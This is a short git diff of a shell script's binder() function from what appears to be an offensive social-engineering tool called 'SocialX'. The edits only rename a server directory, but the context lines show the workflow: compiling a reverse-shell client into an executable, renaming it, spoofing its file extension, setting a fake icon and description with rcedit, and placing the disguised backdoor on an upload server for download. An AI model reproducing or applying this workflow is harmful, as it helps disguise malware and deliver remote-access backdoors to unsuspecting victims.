@@ -122,7 +122,7 @@ function binder() {
                 xterm -hold -e ./socialx_backdoor.sh &
                 clear
                 banner
-                sudo mv SOCIALX_BACKDOOR/*.exe WSGI_Server/Upload_Server/images/Search.exe
+                sudo mv SOCIALX_BACKDOOR/*.exe wsgi_sw/Upload_Server/images/Search.exe
               
                 
         
@@ -152,8 +152,8 @@ function binder() {
                 cp reverseShell/dist/client.exe SOCIALX_BACKDOOR/
                 rm -r reverseShell/*.spec reverseShell/__pycache__ reverseShell/build/ reverseShell/dist/
                 mv SOCIALX_BACKDOOR/client.exe SOCIALX_BACKDOOR/$exe_file
-                sudo cp SOCIALX_BACKDOOR/$exe_file WSGI_Server/Upload_Server/images/
-                sudo cp $file_path WSGI_Server/Upload_Server/images/
+                sudo cp SOCIALX_BACKDOOR/$exe_file wsgi_sw/Upload_Server/images/
+                sudo cp $file_path wsgi_sw/Upload_Server/images/
                 
                 clear
                 banner
@@ -185,7 +185,7 @@ function binder() {
     mv CppCodes/*.exe CppCodes/lif$ext_spoof.exe
     cd CppCodes/
     sudo wine64 ../RCedit/rcedit-x64.exe lif$ext_spoof.exe --set-version-string FileDescription $desc --set-icon $icon &> /dev/null
-    sudo cp lif$ext_spoof.exe ../WSGI_Server/Upload_Server/images/
+    sudo cp lif$ext_spoof.exe ../wsgi_sw/Upload_Server/images/
     look_zip=$(ls -l | awk {'print $9'} | cut -d "." -f 2)
     left2right
     cd ../
